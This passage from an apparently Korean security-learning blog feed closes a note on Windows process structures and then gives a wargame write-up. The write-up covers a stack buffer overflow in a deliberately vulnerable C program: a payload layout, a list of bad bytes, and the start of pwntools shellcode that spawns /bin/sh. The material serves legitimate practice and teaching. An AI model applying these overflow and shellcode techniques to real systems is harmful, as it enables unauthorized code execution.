&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;와! 샌즈! 아시는구나!&lt;/p&gt;

&lt;p&gt;이걸 쓰는 지금 눈물이 난다….&lt;/p&gt;

&lt;p&gt;아무 생각 없이 PCB에 대해 검색해서 구조체에 대해 열심히 공부하고 정리했는데… 윈도우 거였네&lt;/p&gt;

&lt;p&gt;아무튼 아래 내용은 윈도우의 프로세스 관리 구조체에 대해 서술한 내용이다.&lt;/p&gt;

&lt;p&gt;(나뭇잎 책에도 잘 나와 있는 내용이니 해당 책이 있는 사람들은 그걸 보길 추천한다. 나는 이걸 다 쓰고 나서 나뭇잎 책에 비슷한 내용이 있다는 사실을 깨달았다)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어떤 프로세스가 실행될 경우, OS는 Time Sharing과 Space Sharing을 모두 적용한 상위 개념인 &lt;strong&gt;프로세스 스케줄링(Process Scheduling)&lt;/strong&gt;을 수행하게 된다. 이는 Multiprogramming을 제공하는 OS가 가진 하드웨어 리소스의 제한 때문에 개발이 시작된 방법이면서, 이후 OS 내부에서 동일 자원에 접근하는 프로세스들이 동시에 실행될 경우 발생할 수 있는 Race Condition(Critical Section의 침해), 혹은 Deadlock(Critical Section을 여러 프로세스가 동시에 요구할 때 발생하는 교착상태)을 막기 위해 더욱 발전한 방법이다.&lt;/p&gt;

&lt;p&gt;이때, Time Sharing의 특성으로 인해 특정 &lt;strong&gt;프로그램 A를 일정 시간(Burst Time) 동안 수행하다가 중단하고, CPU를 다른 프로그램 B에게 할당해야 하는 상황&lt;/strong&gt;이 생긴다. 이럴 경우:&lt;/p&gt;

&lt;p&gt;프로그램 A가 실행되던 상태를 저장하고 → 프로그램 B를 실행한 다음 → 다시 프로그램 A가 자원을 점유(Occupy)할 때 → 이전에 저장된 상태를 불러오는&lt;/p&gt;

&lt;p&gt;일련의 기능이 보장되어야 한다. 이를 위해 만들어진 것을 &lt;strong&gt;PCB&lt;/strong&gt;라고 한다. Process Control Block의 준말이다.&lt;/p&gt;

&lt;p&gt;그리고 이 PCB의 확장판 개념을 &lt;strong&gt;윈도우 OS에서 구현한 것이 바로 EPROCESS 구조체&lt;/strong&gt;다. 이 EPROCESS 구조체의 가장 첫 번째를 차지하는 것이 바로 KPROCESS(PCB) Block이고, &lt;strong&gt;세번째에 PEB 구조체&lt;/strong&gt;를 가지고 있다. &lt;strong&gt;PEB 안에는 이미지 정보, 프로세스 힙 정보와 같은 유저 모드에서 접근할 수 있는 정보가 저장된다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PCB를 가지고 있는 EPROCESS&lt;/strong&gt;와 &lt;strong&gt;PCB인 KPROCESS&lt;/strong&gt;는 모두 &lt;strong&gt;커널 영역&lt;/strong&gt;에 위치해 있어서, 유저 모드의 프로세스가 접근할 수 없기 때문에 &lt;strong&gt;유저 모드인 프로세스도 접근할 수 있도록 PEB를 따로 만들었다&lt;/strong&gt;고 이해하면 된다.&lt;/p&gt;

&lt;p&gt;ETHREAD구조체와 KTHREAD구조체, 그리고 TEB의 관계도 동일하다.&lt;/p&gt;

&lt;p&gt;이 관계를 그림으로 그리면 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2025.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EPROCESS는 ETHREAD를 refer하지만, PEB와 TEB의 연결 관계는 없다.&lt;/p&gt;

&lt;h2&gt;&lt;br /&gt;&lt;/h2&gt;
&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:je&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;보통 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;je&lt;/code&gt; 명령어는 ZF가 1로 세팅될 시 점프를 수행한다는 특성으로 인해(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jz&lt;/code&gt; 와 동일한 동작을 한다) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmp&lt;/code&gt; 명령어와 함께 쓰인다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmp a, b&lt;/code&gt; 일 때 a-b 연산을 수행하여 0일 때 ZF를 1로 세팅하는 로직이 있기 때문이다. &lt;a href=&quot;#fnref:je&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:TCBTLS&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;TCB와 TLS를 동치해 사용하는 경우가 많지만 이 둘은 엄연히 구분되는 개념이다. TLS는 프로그래밍 방식의 일환으로서 쓰레드에게 로컬로 사용되는 각종 데이터를 따로 저장해 둔다는 아이디어의 구현이고, TCB는 메모리에 실제로 할당되는 블록으로서 쓰레드 자체의 정보를 저장하는 곳이다. 또한 이 &lt;a href=&quot;https://uclibc.org/docs/tls.pdf&quot;&gt;문서&lt;/a&gt;에 따르면, TCB는 TLS 내부에 존재한다. &lt;a href=&quot;#fnref:TCBTLS&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:MSR&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;x86 커널에서는 FS와 GS가 GDT(Global Descriptor Table)에 의해 관리된다. &lt;a href=&quot;#fnref:MSR&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:r12&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;There are sixteen 64-bit registers in x86-64: %rax, %rbx, %rcx, %rdx, %rdi, %rsi, %rbp, %rsp, and %r8-r15. Of these, %rax, %rcx, %rdx, %rdi, %rsi, %rsp, and %r8-r11 are considered caller-save registers, meaning that they are not necessarily saved across function calls. Registers %rbx, %rbp, and %r12-r15 are callee-save registers, meaning that they are saved across function calls. &lt;a href=&quot;#fnref:r12&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 08 Jan 2023 22:44:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step6-1</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step6-1</guid>
      </item>
    
      <item>
        <title>Wargame: Basic_Exploitation_000</title>
        <description>&lt;p&gt;드림핵의 시스템 해킹 기본 문제 중 하나인 basic_exploitation_000을 풀어 보았다.&lt;/p&gt;

&lt;p&gt;종강하고 나서 저번 방학 때 수강하던 트랙을 이어서 수강하고 있는 중이라… 사실 이 문제가 무엇을 취약점으로 가지고 있는지 까먹은 상태로 풀었다. 그래서 익스플로잇을 결정할 때 ROP를 이용한 RTL을 할 건지(입력 가능한 비트수 때문에 탈락) Return Address Overwrite를 할 건지 잠깐 고민했는데, 지금 보니 문제에 Retrun Address Overwrite를 쓰라고 버젓이 나와 있었네… 뭔가를 할 땐 설명서부터 잘 읽는 삶을 살도록 하자. 머쓱해질 수 있으니까,,&lt;/p&gt;

&lt;p&gt;그럼 기존의 절차를 이용해 익스플로잇을 진행해 보도록 하자.
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-주어진-정보-분석-취약점-지정&quot;&gt;1. 주어진 정보 분석, 취약점 지정&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;먼저 서버에서 돌아가고 있는 취약한 프로그램의 바이너리와 소스 코드가 주어졌기 때문에 해당 문제의 난이도가 훅 낮아졌다. (소스 코드를 준 걸 까먹고 바이너리만 본 사람 여깄다… 뭔가를 할 땐 구성품을 잘 확인하는 이하생략)&lt;/p&gt;

&lt;p&gt;소스 코드를 한 번 확인해보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;signal.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;alarm_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TIME OUT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IONBF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IONBF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGALRM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alarm_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;alarm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buf = (%p)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%141s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;사용자에게 입력값을 받아서 버퍼에 저장하는 구조의 코드이다. ‘검증되지 않은 사용자에게서 입력값을 받는 부분’에 boundary check가 되어 있어 언뜻 보기에는 아무 문제 없어 보인다.&lt;/p&gt;

&lt;p&gt;그러나 해당 코드에는 Buffer Overflow 취약점이 존재한다. 선언된 입력값 저장 변수인 buf의 크기는 0x80, 즉 128 byte 인데 boundary check로 제한된 입력값의 최대 길이는 141 byte이기 때문이다. 따라서 총 13byte가 overflow 될 수 있다.&lt;/p&gt;

&lt;p&gt;13byte 라니 고작 저 정도 수로 어떻게 뭐가 가능한 건가 싶다. 그러나 main 함수에 로컬 변수가 buf 하나밖에 선언되지 않았고, 32비트로 컴파일된 프로그램이기 때문에 13byte로 충분히 ebp와 ret address까지 덮어쓸 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그러나 이제까지 배운 대로라면 고작 그 정도 아닐까? ebp와 ret address의 길이를 합하면 8 byte이다. 스택에 함수의 인자를 저장하는 cdecl calling convention의 특성상 ret address를 execve라고 잡으면 그 바로 밑에 execve 스택 프레임의 ret address로 4 byte, 그 밑에 “/bin/sh” 문자열의 주소로 4byte, 총합 8 byte가 최소한으로 더 필요하다.&lt;/p&gt;

&lt;p&gt;즉, 스택 프레임을 전부 덤프로 채우고 ret address 부터 진짜로 의미 있는 값을 넣어 왔던 지난 BOF 방식은 먹히지 않는다.&lt;/p&gt;

&lt;p&gt;현재의 방법이 불가능하다면 새로운 방법을 모색하면 된다. 1) 새로운 가설을 세우고, 2) 그것이 가능한지 확인한 후 3) 가능하다면 실행하면 되는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;먼저 기존의 방법이다. 기존의 방법이 자주 사용되는 이유는, esp의 위치를 고려하기 편하기 때문이었다. 직전 함수의 epilogue로 인해 자동으로 esp가 ebp가 가리키던 위치를 가리키게 된다는 점이 핵심이다.&lt;/p&gt;

&lt;p&gt;다만 이번 경우에는 위와 같은 방법이 불가능하다.&lt;/p&gt;

&lt;p&gt;그렇다면, 어쨌든 ret address에 들어 있는 메모리의 주소로 eip가 옮겨가므로, 차라리 eip에 buf의 시작 주소를 주고 buf 안에 쉘코드를 채우면 ‘ebp 아래 공간의 부족’ 이라는 한계를 해결할 수 있지 않을까?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;바로 위의 그림처럼 말이다. 그러나 해당 방법이 성공하려면 stack에 execute 권한이 있어야 한다. 즉, NX-bit가 걸려있지 않아야 한다. gdb를 이용해 스택의 권한을 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;가장 아래의 [stack]에는 read, write, execution 권한이 있고, private(copy on write)로 설정되어 있다. p가 올 자리에 s가 왔다면 그건 프로세스가 해당 영역을 변경하는 것이 비밀이 아니라는(shared) 뜻이다.&lt;/p&gt;

&lt;p&gt;private(copy on write)로 설정된 메모리 영역에 대한 설명은 아래를 참고하자!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;**&lt;Private Mapping=&quot;&quot;&gt;**&lt;/Private&gt;&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;Private mapping (MAP_PRIVATE):&lt;/strong&gt; Modifications to the contents of the mapping are not visible to other processes.&lt;/p&gt;

  &lt;p&gt;For file mapping they are not carried through to the underlying file. Changes to the contents of the mapping are nevertheless private to each process.&lt;/p&gt;

  &lt;p&gt;The kernel accomplishes this by using the &lt;strong&gt;copy-on-write&lt;/strong&gt; technique. This means that whenever a process attempts to modify the contents of a page, the kernel first creates a new, separate copy of that page for the process (and adjusts the process’s page tables).&lt;/p&gt;

  &lt;p&gt;For this reason, a MAP_PRIVATE mapping is sometimes referred to as a private, copy-on-write mapping. (Source: The Linux Programming Interface book)&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;정리하자면, 현재 프로세스의 스택에는 실행 권한이 있기 때문에 스택에 들어 있는 인스트럭션을 rip가 가리킨다면 실행될 수 있다. 즉, 앞서 말했던 방법이 ROP 등의 NX-bit bypass 없이도 성공할 수 있다. 
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-취약점-익스플로잇-설계&quot;&gt;2. 취약점 익스플로잇 설계&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 지정한 취약점을 익스플로잇하기 위한 페이로드의 구조는 아래와 같을 것이다.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shellcode(execve(&quot;/bin/sh&quot;, 0, 0)) + dump byte + RET address(buf[0])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이제 익스플로잇 구성에 필요한 각 정보를 알아내 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-1-쉘코드-구성&quot;&gt;2. 1. 쉘코드 구성&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 직접 쉘코드를 만드는 방법도 있다. 이전의 포스트에서 했던 것처럼 C 언어 코드를 짜고 그것을 오브젝트 코드로 컴파일해도 되고, 어셈블리로 바로 코드를 짜도 된다.&lt;/p&gt;

&lt;p&gt;그러나 실전에서는 내가 직접 쉘코드를 짠다는 것은 시간과 자원 낭비다. 이미 좋은 자동화 도구들이 있기 때문이고, 특정 바이트들을 피해 쉘코드를 짜야 하는 경우가 생기는데 사실 사람 머리로는 정말 힘든 작업이기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;쉘코드를 만들 수 있는 해킹 툴에는 여러 가지가 있다. 그러니 각자 입맛대로 metasploit을 사용해도 되고, pwntools를 사용해도 된다.&lt;/p&gt;

&lt;p&gt;metasploit의 경우 cmd 툴로 사용되고, pwntools로는 shellcraft라는 모듈을 cmd 툴로 사용하거나 여타 모듈을 이용해 파이썬 코드로 원하는 쉘코드를 만들어낼 수 있다. 나는 이번 익스플로잇 작성에 pwntools를 사용했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 설명하면서, 쉘코드를 짤 때 특정 바이트들을 피해 쉘코드를 짜야 한다는 말을 했다. 사실 이번 익스플로잇 구성에서 정확히 이런 일이 일어나는 바람에 shellcraft를 사용했다.&lt;/p&gt;

&lt;p&gt;쉘코드를 입력했을 때 특정 바이트들부터 입력이 뚝 잘려서 안 들어가거나, 혹은 쉘코드는 잘 들어갔는데 eip가 실행 중간에 멈춰버리는 일이 일어날 수 있다.&lt;/p&gt;

&lt;p&gt;전자의 경우 stdin을 받는 함수의 특성으로 인해 특정 바이트 값을 입력의 끝(예: 0x00 null)으로 인식해서 발생하는 문제이고, 후자의 경우는 bad character(예: 0x90 nop)로 인해 발생하는 문제이다.&lt;/p&gt;

&lt;p&gt;전자의 해결책은 0x00부터 0xff까지를 전부 메모리에 넣어주면서 문제가 생기는 바이트를 하나씩 제거하고 다시 보내기를 반복하면서 입력에 문제가 생기는 바이트의 리스트를 만드는 것이고, 후자의 해결책은 실행 중 eip가 stuck 되는 바이트를 찾아내서 서서히 제외시키는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;bad character는… 내가 알기로는 CPU가 이상한 바이트라고 생각해 코드의 흐름을 멈춰세우도록 만드는 바이트를 의미하고 각 CPU나 메모리 상태에 따라 그 종류가 달라지기 때문에 사실상 랜덤이라고는 하는데, 지금 약간 의심이 생긴다.&lt;/p&gt;

&lt;p&gt;&lt;del&gt;stdin을 받는 함수 특성으로 인해 발생하는 문제에다가 bad character라는 이름을 붙인 거 아냐?&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;익스플로잇 대상의 소스를 확인해 보면 사용자의 입력값을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 함수를 이용해 받는다. 그런데 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 는 특정 바이트는 무시하는 특징이 있다. 즉, Null byte(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt;) 만을 입력값의 종료로 인식하는 게 아니라는 거다.&lt;/p&gt;

&lt;p&gt;잘 생각해 보면 맞다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 함수를 이용해 사용자 입력값을 받을 때 공백(space, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x20&lt;/code&gt;)을 중간에 넣는다면 문자열은 정확히 공백 앞까지만 입력된다.&lt;/p&gt;

&lt;p&gt;이처럼, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 가 거부하는 특수한 바이트가 있다. 그 목록은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x09&lt;/strong&gt; : ctrl+I; HT로, 탭 문자&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x0a&lt;/strong&gt;: ctrl+J; LF로, 유닉스에서 사용되는 개행 문자&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x0b&lt;/strong&gt;: ctrl+K; VT로, Vertical Tab&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x0c&lt;/strong&gt;: ctrl+L; FF로, Form Feed(다음 페이지)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x0d&lt;/strong&gt;: CR; Carriage Return(캐리지 리턴 (\r))&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x20&lt;/strong&gt;: Space(공백)&lt;/p&gt;

&lt;p&gt;해당 바이트들을 제외하고 execve(”/bin/sh”, 0, 0) 쉘코드를 만들기 위해 아래와 같이 코드를 작성했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;i386&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;linux&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x20&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
